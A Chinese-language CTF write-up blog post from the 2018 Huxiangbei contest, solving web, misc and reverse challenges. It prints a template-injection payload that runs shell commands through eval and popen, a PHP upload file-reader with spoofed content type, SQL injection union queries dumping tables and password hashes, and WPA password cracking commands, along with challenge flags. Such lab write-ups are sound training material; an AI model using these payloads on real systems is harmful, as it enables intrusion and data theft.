---
layout: posts
title: 湖湘杯2018Writeup--WaterD2op
date: 2018-11-19 19:00:00
tags: writeup

---

湖湘杯2018writeup

<!--more-->

## web

### 1.xme0

#### 解题思路和相关代码

网页下面有提示，使用了模板

{% asset_img 1.png %}

尝试模板注入，发现发帖后再查看存在模板注入
构造任意命令执行：

```html
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}

```

发现flag不在常规位置
使用grep搜索

```html
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('grep -r -n \"hxb\" /home/XmeO').read()") }}{% endif %}{% endfor %}

```

#### flag截图

{% asset_img 2.png%}

### Mynote

#### 解题思路

文件上传，由于使用阿里云服务器，很容易被封ip
一般的`shell`都被发现封了ip

#### 相关代码

最后使用：

```php
<?php
$myfile = fopen("/var/www/html/flag.php", "r") or die("Fail!");
echo fread($myfile, filesize("/var/www/html/flag.php"));
fclose($myfile);
?>
```

要改变http头的`content-type`为`image/jpg`

#### flag截图

最后读到`flag.php`

{%asset_img 3.png %}

### Readflag

#### 解题思路

直接用文件协议读取，但`flag`藏得太深，艰难寻找

#### 相关代码和flag截图

{%asset_img 4.png%}

### Codecheck

#### 解题思路

扫目录：

{% asset_img 5.png%}

去new目录看看，发现源码：

{% asset_img 6.png %}

下下来发现解密函数和直接拼接的数据库查询语句

```php
function decode($data){
	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,'',MCRYPT_MODE_CBC,'');
	mcrypt_generic_init($td,'ydhaqPQnexoaDuW3','2018201920202021');
	$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));
	mcrypt_generic_deinit($td);
	mcrypt_module_close($td);
	if(substr(trim($data),-7)!=='hxb2018'){
		echo '<script>window.location.href="/index.php";</script>';
	}else{
		return substr(trim($data),0,strlen(trim($data))-7);
	}
}
```

#### 相关代码

编写相应的加密函数，接下来就是常规的数据库注入

```php
function encode($data){
	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,'',MCRYPT_MODE_CBC,'');
	mcrypt_generic_init($td,'ydhaqPQnexoaDuW3','2018201920202021');
    // $data = mencrypt_generic($td,base64_decode(base64_decode($data)));
    $encrypted = mcrypt_generic($td,$data.'hxb2018');
	mcrypt_generic_deinit($td);
	mcrypt_module_close($td);
	return  base64_encode(base64_encode($encrypted));
}
$target="1 and 1=0 union select 1, 2 ,group_concat(name,0x7c,password),4 from stormgroup_member";
// mozhe1|356f589a7df439f6f744ff19bb8092c0,mozhe2|faaed61b9f60a75543923f59b90b2902
//dsan13,813945
$target="1 and 1=0 union select 1, 2 ,group_concat(table_name),4 from information_schema.tables where table_schema='mysql'";
//
$target="1 and 1=0 union select 1, 2 ,group_concat(column_name),4 from information_schema.columns where table_name='notice2'";
//id,title
$target="1 and 1=0 union select 1, 2 ,group_concat(id,0x7c,title),4 from notice2";
echo(encode($target));
```

#### flag截图

{% asset_img 7.png %}

## misc

### 5.welcome

关注公众号获取 `flag`

{% asset_img 8.png %}

#### 6.flow

#### 相关思路及代码

打开流量包发现里面有一个`SSID`为`ctf`的wifi名，而当前数据是通过802.11来进行加密的，所以我们第一步就需要进行爆破。

{% asset_img 9.png %}

从网上找到几个WiFi密码的字典，然后使用`aircrack-ng`来进行爆破：

```bash
aircrack-ng -w wpa-dictionary/huanying-0.txt ctf.pcap
```

{% asset_img 10.png %}

很快就把密码爆破出来了，然后我们通过这个密码将流量包解密，

```bash
airdecap-ng -e ctf ctf.pcap -p password1
```

{% asset_img 11.png %}

```bash
strings ctf-dec.pcap |grep 'flag'
```



{% asset_img 12.png %}

#### flag

最终拿到flag：`flag{H4lf_1s_3n0ugh}`

### disk

#### 解题思路

用`010editor`打开，查找`flag`字符串，发现有多个匹配

{% asset_img 13.png %}

发现里面有可疑的二进制串
搞出来试试

#### 相关代码

```python
res = ''
s = ''
s += '0110011001101100011000010110011101'
s += '1110110011010001000100010100110101'
s += '1111001100010110111001011111010001'
s += '0000110001011100110110101101111101'
for k in range(s.__len__() / 32):
    ss = s[32 * k : 32 * k + 32]
    a = int(ss, 2)
    aa = hex(a)[2:]
    for i in range(aa.__len__() / 2):
        res += chr(int('0x' + aa[2 * i : 2 * i + 2], 16))
print res
```

#### flag截图

{% asset_img 14.png %}

加上一个括号即可

## reverse

### 8.Replace

首先拖进 IDA,无法反编译，使用 `PEID` 查看发现加了 `upx` 的壳，直接上网找脱壳工具：https://github.com/upx/upx/releases/tag/v3.95
脱完壳后就能在`IDA`中查看程序逻辑

{% asset_img 15.png %}

直接使用爆破求解

#### 相关代码

```python
#coding=utf-8
len = 35;
flag = ''

replace1 =[
  0x32, 0x61, 0x34, 0x39, 0x66, 0x36, 0x39, 0x63, 0x33, 0x38, 
  0x33, 0x39, 0x35, 0x63, 0x64, 0x65, 0x39, 0x36, 0x64, 0x36, 
  0x64, 0x65, 0x39, 0x36, 0x64, 0x36, 0x66, 0x34, 0x65, 0x30, 
  0x32, 0x35, 0x34, 0x38, 0x34, 0x39, 0x35, 0x34, 0x64, 0x36, 
  0x31, 0x39, 0x35, 0x34, 0x34, 0x38, 0x64, 0x65, 0x66, 0x36, 
  0x65, 0x32, 0x64, 0x61, 0x64, 0x36, 0x37, 0x37, 0x38, 0x36, 
  0x65, 0x32, 0x31, 0x64, 0x35, 0x61, 0x64, 0x61, 0x65, 0x36
];

replace2 =[
  0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 
  0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 
  0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 
  0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 
  0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 
  0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 
  0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 
  0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 
  0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 
  0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 
  0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 
  0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 
  0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 
  0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 
  0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 
  0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 
  0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 
  0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 
  0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 
  0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 
  0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 
  0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 
  0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 
  0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 
  0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 
  0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16
 ];

flag = ''

for i in range(0,35):
  for j in range(0,128):
    v6 = j>>4%6;
    v7 = (16 * j >> 4) % 16;
    rechrA = replace1[2 * i];
    if ( rechrA < 48 or rechrA > 57 ):
        v9 = rechrA - 87;
    else:
        v9 = rechrA - 48;
    rechrB = replace1[2 * i+1];
    v11 = 16 * v9;
    if ( rechrB < 48 or rechrB > 57 ):
      v12 = rechrB - 87;
    else: 
      v12 = rechrB - 48;
    if (replace2[16 * v6 + v7] == ((v11 + v12) ^ 0x19) ):
        flag+=chr(j)
        
print flag
```

#### flag截图

{% asset_img 16.png %}

